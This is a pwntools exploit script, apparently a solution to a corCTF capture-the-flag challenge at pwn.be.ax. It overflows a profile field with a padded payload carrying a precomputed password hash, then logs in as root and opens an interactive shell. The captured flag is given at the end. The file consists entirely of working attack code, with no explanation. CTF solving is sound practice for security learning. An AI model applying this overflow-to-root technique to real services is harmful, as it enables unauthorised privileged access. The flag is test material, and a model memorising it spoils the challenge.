#!/usr/bin/python3

from pwn import *


ADDRESS = "pwn.be.ax"
PORT = 5001

io = remote(ADDRESS, PORT)

p = process("./pass") # This is the file that was used to generate the hashed password using C
password = p.recvline().strip()
p.close()

def create_profile():
	io.sendlineafter("> ", "admin")
	io.sendlineafter("> ", "password")
	io.sendlineafter("> ", "120")
	
	payload = b"A"*(0xb3)
	payload += b"PPPPPPP\x00"
	payload += password
	
	io.sendline(payload)

def logout():
	io.sendlineafter("Choice > ", b"1")
	io.sendlineafter("Username:", b"root")
	io.sendlineafter("Password:", b"password")

def shell():
	io.sendlineafter("Choice >", b"3")

def main():
	create_profile()
	logout()
	shell()
	io.interactive()

if __name__ == "__main__":
	main()

# flag --> corctf{tc4ch3_r3u5e_p1u5_0v3rfl0w_equ4l5_r007}

